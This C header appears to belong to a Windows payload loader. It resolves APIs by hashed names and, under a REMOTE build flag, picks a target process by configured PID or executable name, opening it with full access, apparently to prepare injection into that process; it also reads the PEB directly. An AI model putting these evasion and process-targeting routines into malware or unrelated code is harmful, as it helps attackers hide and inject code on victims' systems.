#pragma once
#include "../../includes/core/core.h"
#include "../../includes/core/nt.h"
#include "../../includes/apis/apis.h"
#include <tlhelp32.h>






#ifdef REMOTE

static inline void resolve_snapshot_apis(void) {
    if (!g_ldr->apis->pCreateToolhelp32Snapshot)
        g_ldr->apis->pCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATETOOLHELP32SNAPSHOT);
    if (!g_ldr->apis->Process32NextW)
        g_ldr->apis->Process32NextW = (pProcess32Next)GetProc(g_ldr->apis->modules.kernel32, HASHED_PROCESS32NEXTW);
    if (!g_ldr->apis->Process32FirstW)
        g_ldr->apis->Process32FirstW = (pProcess32First)GetProc(g_ldr->apis->modules.kernel32, HASHED_PROCESS32FIRSTW);
}

static inline HANDLE open_process_by_pid(DWORD pid) {
    HANDLE h = g_ldr->apis->OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    return h;

}

static inline HANDLE open_process_by_name(PWCHAR name, PDWORD chosenPid) {
    resolve_snapshot_apis();

    HANDLE s = g_ldr->apis->pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE hProc = NULL;

    if (g_ldr->apis->Process32FirstW(s, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                hProc = open_process_by_pid(pe.th32ProcessID);
                if (hProc) {
                    *chosenPid = pe.th32ProcessID;
                    g_ldr->apis->CloseHandle(s);
                    return hProc;
                }
            }
        } while (g_ldr->apis->Process32NextW(s, &pe));
    }
    g_ldr->apis->CloseHandle(s);
    return hProc;
}

static inline HANDLE resolve_target_process(PDWORD chosenPid) {
    if (g_ldr->config->remoteSettings.pid != 0) {
        HANDLE h = open_process_by_pid(g_ldr->config->remoteSettings.pid);
        if (h) {
            *chosenPid = g_ldr->config->remoteSettings.pid;
            return h;
        }
        DBGA("[!] Failed to open PID %lu\n", g_ldr->config->remoteSettings.pid);
    }

    if (g_ldr->config->remoteSettings.ProcessName[0] != L'\0') {
        HANDLE h = open_process_by_name(g_ldr->config->remoteSettings.ProcessName, chosenPid);
        if (h)
            return h;
        DBGA("[!] Failed to open process by name\n");
    }

    return NULL;
}

#endif

static inline PPEB GetPeb() {
#if defined(_WIN64) || defined(__x86_64__)
    return (PPEB)__readgsqword(0x60);
#elif defined(_M_IX86)|| defined(__i386__)
    return (PPEB)__readfsdword(0x30);
#endif
}